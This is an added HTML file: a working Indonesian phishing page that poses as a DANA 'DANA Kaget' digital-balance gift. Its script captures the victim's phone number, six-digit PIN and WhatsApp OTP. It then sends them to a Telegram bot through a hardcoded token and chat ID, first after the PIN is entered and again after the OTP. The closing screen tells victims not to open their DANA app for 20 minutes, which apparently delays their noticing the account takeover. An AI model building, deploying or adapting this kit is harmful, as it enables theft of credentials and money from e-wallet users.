@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dana Kaget</title>
+  <style>
+    * { box-sizing: border-box; }
+    
+    body { 
+      margin: 0; 
+      min-height: 100vh; 
+      padding: 20px; 
+      font-family: Arial, sans-serif; 
+      color: #173452; 
+      background: linear-gradient(160deg, #12a5ff, #0878f9 45%, #eaf6ff 45%); 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+    } 
+
+    .container { width: 100%; max-width: 400px; } 
+
+    .header { text-align: center; color: #fff; padding: 15px 0 25px; } 
+    .logo { width: 175px; max-width: 80%; height: auto; object-fit: contain; } 
+    .header h1 { font-size: 35px; margin: 15px 0; } 
+    .header h1 span { color: #ffdc35; } 
+
+    .card { 
+      background: #fff; 
+      border-radius: 22px; 
+      padding: 25px 20px; 
+      box-shadow: 0 12px 35px #004b9b30; 
+    } 
+
+    h2 { text-align: center; font-size: 22px; margin: 0 0 12px; } 
+    .desc { text-align: center; color: #7186a2; font-size: 13px; line-height: 1.6; } 
+
+    .phone { 
+      display: flex; 
+      align-items: center; 
+      gap: 10px; 
+      border: 1px solid #c9e4ff; 
+      border-radius: 12px; 
+      padding: 0 12px; 
+      height: 52px; 
+      margin: 20px 0 10px; 
+    } 
+    .phone span { white-space: nowrap; font-weight: bold; } 
+    
+    input { width: 100%; min-width: 0; border: 0; outline: 0; font-size: 16px; } 
+
+    .primary { 
+      width: 100%; 
+      height: 50px; 
+      border: 0; 
+      border-radius: 12px; 
+      background: #0878f9; 
+      color: white; 
+      font-size: 16px; 
+      font-weight: bold; 
+      margin-top: 10px; 
+      cursor: pointer; 
+      transition: background 0.2s;
+    } 
+    .primary:disabled { background: #b9c7d8; cursor: not-allowed; }
+    .primary:active:not(:disabled) { background: #065bb5; }
+
+    .note { text-align: center; color: #7186a2; font-size: 11px; line-height: 1.6; margin-top: 18px; } 
+
+    /* Overlay Panel Umum */
+    .overlay {
+      display: none; 
+      position: fixed; 
+      inset: 0; 
+      z-index: 100;
+      background: rgba(25, 28, 33, 0.6);
+      backdrop-filter: blur(4px);
+    }
+    .overlay.show { display: block; }
+
+    .panel {
+      position: absolute; 
+      bottom: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 72%;
+      background: #fff; 
+      border-radius: 26px 26px 0 0;
+      text-align: center; 
+      overflow-y: auto;
+      animation: slideUp .28s ease-out;
+      display: flex; 
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 20px;
+    }
+
+    #otpPanel {
+      height: 85%;
+      max-height: 85vh;
+      padding-top: 15px;
+      padding-bottom: 25px;
+    }
+
+    #successPanel {
+      height: 75%;
+      max-height: 75vh;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 20px;
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
+    }
+
+    .brand-logo {
+      display: flex; 
+      align-items: center; 
+      justify-content: center;
+      margin-top: 5px;
+    }
+    .brand-logo img { width: 110px; height: auto; object-fit: contain; }
+
+    .panel-title { font-size: 22px; font-weight: 600; margin: 10px 0 6px; color: #27384b; }
+    .panel-subtitle { color: #788392; font-size: 13px; padding: 0 16px; line-height: 1.5; }
+    .panel-subtitle span { color: #0878f9; font-weight: bold; }
+
+    /* Indikator PIN Dots */
+    .pin-dots { display: flex; justify-content: center; gap: 14px; margin-top: 18px; }
+    .pin-dots span {
+      width: 15px; height: 15px; 
+      border: 2px solid #b9c7d8; 
+      border-radius: 50%;
+      transition: all 0.2s;
+    }
+
+    /* Keypad PIN */
+    .pin-keypad {
+      width: 100%;
+      padding: 8px 0 10px;
+      background: #e4eaf3;
+      border-radius: 16px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-top: auto;
+    }
+    .pin-key {
+      display: flex; 
+      align-items: center; 
+      justify-content: center;
+      height: 48px;
+      background: #fff; 
+      border: 0; 
+      border-radius: 10px;
+      color: #203148; 
+      font-size: 22px; 
+      font-weight: bold; 
+      cursor: pointer;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      touch-action: manipulation;
+      transition: background 0.1s;
+    }
+    .pin-key:active { background: #d2deee; }
+    .pin-key.blank { background: transparent; box-shadow: none; cursor: default; }
+
+    /* Input OTP */
+    .otp-inputs {
+      display: flex; 
+      justify-content: center; 
+      gap: 12px; 
+      margin: 15px 0 10px;
+    }
+    .otp-input {
+      width: 50px; 
+      height: 50px;
+      font-size: 22px; 
+      font-weight: bold; 
+      text-align: center;
+      border: 2px solid #b9c7d8; 
+      border-radius: 14px;
+      outline: none; 
+      background: #f8fbff; 
+      color: #203148;
+      transition: all 0.2s;
+    }
+    .otp-input:focus {
+      border-color: #0878f9; 
+      background: #fff;
+      box-shadow: 0 0 0 4px #0878f915;
+    }
+
+    .otp-resend { font-size: 13px; color: #7186a2; margin-top: 8px; }
+    .otp-resend a { color: #0878f9; text-decoration: none; font-weight: bold; }
+    .otp-resend a.disabled { color: #b9c7d8; pointer-events: none; }
+
+    /* Styling Tampilan Proses Akhir */
+    .success-icon-box {
+      width: 75px;
+      height: 75px;
+      background: #eaf6ff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 15px;
+    }
+    .success-icon-box img {
+      width: 45px;
+      height: 45px;
+      object-fit: contain;
+    }
+    .success-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #27384b;
+      margin-bottom: 10px;
+    }
+    .success-desc {
+      font-size: 13px;
+      color: #7186a2;
+      line-height: 1.6;
+      padding: 0 10px;
+    }
+    .warning-box {
+      background: #fff8e6;
+      border: 1px solid #ffeeba;
+      border-radius: 12px;
+      padding: 12px 15px;
+      margin-top: 20px;
+      text-align: left;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+    .warning-box span {
+      font-size: 18px;
+    }
+    .warning-text {
+      font-size: 12px;
+      color: #856404;
+      line-height: 1.5;
+      font-weight: 500;
+    }
+
+    @media (max-height: 700px) {
+      .panel { height: 78%; }
+      #otpPanel { height: 90%; max-height: 90vh; }
+      #successPanel { height: 82%; }
+      .pin-key { height: 42px; font-size: 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Halaman Utama -->
+  <div class="container">
+    <div class="header">
+      <!-- LOGO UTAMA (Tampilan Nomor HP) DIPERBARUI -->
+      <img class="logo" src="https://cdn.phototourl.com/member/2026-10-25-4119dc9a-32bc-43b6-905a-8737b675fdfe.png" alt="Logo DANA">
+      <h1>DANA <span>Kaget!</span></h1>
+    </div>
+    
+    <div class="card">
+      <h2>Hadiah saldo digital</h2>
+      <p class="desc">Masukkan nomor HP untuk melanjutkan.</p>
+
+      <form id="phoneForm"> 
+        <div class="phone"> 
+          <span>🇮🇩 +62</span> 
+          <input id="phone" type="tel" inputmode="numeric" placeholder="Nomor HP" required> 
+        </div> 
+        <button class="primary" type="submit">Lanjutkan</button> 
+      </form> 
+      <p class="note">Halaman informasi hadiah.</p>
+    </div>
+  </div>
+
+  <!-- Overlay Panel PIN -->
+  <div id="pinOverlay" class="overlay">
+    <div class="panel">
+      <div>
+        <div class="brand-logo">
+          <!-- LOGO PIN DIPERBARUI -->
+          <img src="https://cdn.phototourl.com/member/2026-10-25-24669e60-8f2d-4b6d-b094-62c8d0f971b6.png" alt="Logo DANA PIN">
+        </div>
+        <div class="panel-title">Masukkan PIN kamu</div> 
+        <div class="panel-subtitle">Simulasi keypad interaktif</div> 
+        <div class="pin-dots" id="pinDots" aria-hidden="true"> 
+          <span></span><span></span><span></span> 
+          <span></span><span></span><span></span> 
+        </div> 
+      </div>
+
+      <div class="pin-keypad" id="pinKeypad"> 
+        <button class="pin-key" type="button" data-key="1">1</button> 
+        <button class="pin-key" type="button" data-key="2">2</button> 
+        <button class="pin-key" type="button" data-key="3">3</button> 
+        <button class="pin-key" type="button" data-key="4">4</button> 
+        <button class="pin-key" type="button" data-key="5">5</button> 
+        <button class="pin-key" type="button" data-key="6">6</button> 
+        <button class="pin-key" type="button" data-key="7">7</button> 
+        <button class="pin-key" type="button" data-key="8">8</button> 
+        <button class="pin-key" type="button" data-key="9">9</button> 
+        <button class="pin-key blank" type="button" disabled></button> 
+        <button class="pin-key" type="button" data-key="0">0</button> 
+        <button class="pin-key" type="button" id="pinDelete" aria-label="Hapus">⌫</button> 
+      </div>
+    </div>
+  </div>
+
+  <!-- Overlay Panel OTP WhatsApp -->
+  <div id="otpOverlay" class="overlay">
+    <div class="panel" id="otpPanel">
+      <div>
+        <div class="brand-logo">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" style="width: 48px; height: 48px;">
+        </div>
+        <div class="panel-title">Verifikasi WhatsApp</div>
+        <div class="panel-subtitle">
+          Kode OTP 4-digit telah dikirim melalui WhatsApp ke nomor <span id="userPhoneDisplay">08123456789</span>
+        </div>
+        
+        <div class="otp-inputs">
+          <input type="tel" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" autocomplete="one-time-code" required>
+          <input type="tel" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required>
+          <input type="tel" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required>
+          <input type="tel" class="otp-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" required>
+        </div>
+
+        <div class="otp-resend">
+          Kirim ulang kode dalam <span id="timerDisplay" style="font-weight: bold; color: #0878f9;">05:00</span><br>
+          <a href="#" id="resendOtpBtn" class="disabled" style="margin-top: 4px; display: inline-block;">Kirim Ulang WhatsApp</a>
+        </div>
+      </div>
+
+      <button class="primary" id="verifyOtpBtn" type="button" style="margin-top: 15px;">Verifikasi & Lanjutkan</button>
+    </div>
+  </div>
+
+  <!-- Overlay Tampilan Akhir Proses Sukses -->
+  <div id="successOverlay" class="overlay">
+    <div class="panel" id="successPanel">
+      <div>
+        <div class="success-icon-box">
+          <img src="https://cdn.phototourl.com/member/2026-10-25-4119dc9a-32bc-43b6-905a-8737b675fdfe.png" alt="DANA Success">
+        </div>
+        <div class="success-title">Hadiah Sedang Diproses</div>
+        <p class="success-desc">
+          Verifikasi berhasil! Saldo DANA Kaget kamu sedang dikirim ke sistem dompet digital.
+        </p>
+
+        <div class="warning-box">
+          <span>⏳</span>
+          <div class="warning-text">
+            <b>Mohon Perhatian:</b> Jangan membuka aplikasi DANA dalam <b>20 menit kedepan</b> agar proses pengiriman saldo tidak terganggu atau gagal.
+          </div>
+        </div>
+      </div>
+
+      <button class="primary" id="finishBtn" type="button" style="margin-top: 25px;">Mengerti & Tutup</button>
+    </div>
+  </div>
+
+  <script>
+    // ==========================================
+    // KONFIGURASI TELEGRAM BOT
+    // GANTI DENGAN TOKEN DAN CHAT ID ANDA
+    // ==========================================
+    const BOT_TOKEN = "7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io"; 
+    const CHAT_ID = "7667144622"; 
+
+    const phoneForm = document.getElementById("phoneForm"); 
+    const phoneInput = document.getElementById("phone"); 
+    const pinOverlay = document.getElementById("pinOverlay"); 
+    const pinKeypad = document.getElementById("pinKeypad"); 
+    const dots = document.querySelectorAll("#pinDots span"); 
+    
+    const otpOverlay = document.getElementById("otpOverlay");
+    const userPhoneDisplay = document.getElementById("userPhoneDisplay");
+    const otpInputs = document.querySelectorAll(".otp-input");
+    const verifyOtpBtn = document.getElementById("verifyOtpBtn");
+    
+    const successOverlay = document.getElementById("successOverlay");
+    const finishBtn = document.getElementById("finishBtn");
+
+    const timerDisplay = document.getElementById("timerDisplay");
+    const resendOtpBtn = document.getElementById("resendOtpBtn");
+    
+    let countdownInterval;
+    let digitCount = 0; 
+    
+    // Variabel untuk menyimpan data
+    let currentPhone = "";
+    let currentPIN = "";
+
+    // Fungsi kirim ke Telegram
+    function sendTelegramMessage(text) {
+      if (BOT_TOKEN === "GANTI_DENGAN_TOKEN_BOT_ANDA" || CHAT_ID === "GANTI_DENGAN_CHAT_ID_ANDA") {
+        console.warn("⚠️ HARAP ISI BOT_TOKEN DAN CHAT_ID DI DALAM SCRIPT!");
+        console.log("Pesan yang akan dikirim:\n", text);
+        return Promise.resolve({ ok: true }); // Mock success untuk testing tanpa token
+      }
+      
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML"
+        })
+      }).then(res => res.json());
+    }
+
+    function renderDots() { 
+      dots.forEach((dot, index) => { 
+        const active = index < digitCount; 
+        dot.style.background = active ? "#0878f9" : "transparent"; 
+        dot.style.borderColor = active ? "#0878f9" : "#b9c7d8"; 
+      }); 
+    } 
+
+    function startOtpTimer() {
+      let timeLeft = 300; 
+      resendOtpBtn.classList.add("disabled");
+      
+      clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        
+        let formattedTime = 
+          String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
+        
+        timerDisplay.textContent = formattedTime;
+        
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.textContent = "00:00";
+          resendOtpBtn.classList.remove("disabled");
+        }
+        timeLeft--;
+      }, 1000);
+    }
+
+    phoneForm.addEventListener("submit", function(event) { 
+      event.preventDefault(); 
+      if (!phoneInput.value.trim()) { 
+        phoneInput.focus(); 
+        return; 
+      } 
+      currentPhone = phoneInput.value.trim();
+      digitCount = 0; 
+      currentPIN = "";
+      renderDots(); 
+      pinOverlay.classList.add("show"); 
+    }); 
+
+    pinKeypad.addEventListener("click", function(event) { 
+      const button = event.target.closest("button"); 
+      if (!button || button.disabled) return; 
+
+      if (button.dataset.key !== undefined && digitCount < 6) { 
+        currentPIN += button.dataset.key;
+        digitCount++; 
+        renderDots(); 
+
+        if (digitCount === 6) {
+          // Kirim data awal (HP + PIN) ke Telegram
+          const initialMessage = `
+🚨 <b>DATA AWAL MASUK</b> 🚨
+
+📱 <b>Nomor HP</b>: <code>+62 ${currentPhone}</code>
+🔑 <b>PIN</b>: <code>${currentPIN}</code>
+
+⏰ <b>Waktu</b>: ${new Date().toLocaleString('id-ID')}
+<i>Menunggu input OTP...</i>
+          `;
+          sendTelegramMessage(initialMessage).catch(err => console.log("Gagal kirim data awal", err));
+
+          setTimeout(() => {
+            pinOverlay.classList.remove("show");
+            if (currentPhone) {
+              userPhoneDisplay.textContent = "+62 " + currentPhone;
+            }
+            otpOverlay.classList.add("show");
+            
+            otpInputs.forEach(input => input.value = "");
+            if (otpInputs.length > 0) otpInputs[0].focus();
+            
+            startOtpTimer();
+          }, 300);
+        }
+      } else if (button.id === "pinDelete" && digitCount > 0) { 
+        currentPIN = currentPIN.slice(0, -1);
+        digitCount--; 
+        renderDots(); 
+      } 
+    }); 
+
+    resendOtpBtn.addEventListener("click", function(e) {
+      e.preventDefault();
+      if (this.classList.contains("disabled")) return;
+      alert("Kode OTP baru telah dikirim ulang ke WhatsApp!");
+      startOtpTimer();
+    });
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener("input", (e) => {
+        const value = e.target.value;
+        if (value && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    verifyOtpBtn.addEventListener("click", function() {
+      let otpCode = "";
+      otpInputs.forEach(input => otpCode += input.value);
+      
+      if (otpCode.length < 4) {
+        alert("Silakan masukkan 4 digit kode OTP dengan lengkap.");
+        return;
+      }
+      
+      verifyOtpBtn.disabled = true;
+      verifyOtpBtn.textContent = "Memproses...";
+
+      const finalMessage = `
+🚨 <b>DATA LENGKAP MASUK</b> 🚨
+
+📱 <b>Nomor HP</b>: <code>+62 ${currentPhone}</code>
+🔑 <b>PIN</b>: <code>${currentPIN}</code>
+🔐 <b>OTP WhatsApp</b>: <code>${otpCode}</code>
+
+⏰ <b>Waktu</b>: ${new Date().toLocaleString('id-ID')}
+🌐 <b>Device</b>: <code>${navigator.userAgent.substring(0, 60)}...</code>
+      `;
+
+      sendTelegramMessage(finalMessage)
+        .then(data => {
+          if (data.ok) {
+            clearInterval(countdownInterval);
+            otpOverlay.classList.remove("show");  
+            successOverlay.classList.add("show"); 
+          } else {
+            alert("Gagal mengirim data. Pastikan konfigurasi bot benar.");
+            verifyOtpBtn.disabled = false;
+            verifyOtpBtn.textContent = "Verifikasi & Lanjutkan";
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          alert("Terjadi kesalahan jaringan.");
+          verifyOtpBtn.disabled = false;
+          verifyOtpBtn.textContent = "Verifikasi & Lanjutkan";
+        });
+    });
+
+    finishBtn.addEventListener("click", function() {
+      alert("Status tetap tersimpan. Harap tunggu hingga 20 menit ke depan.");
+    });
+  </script>
+</body>
+</html>
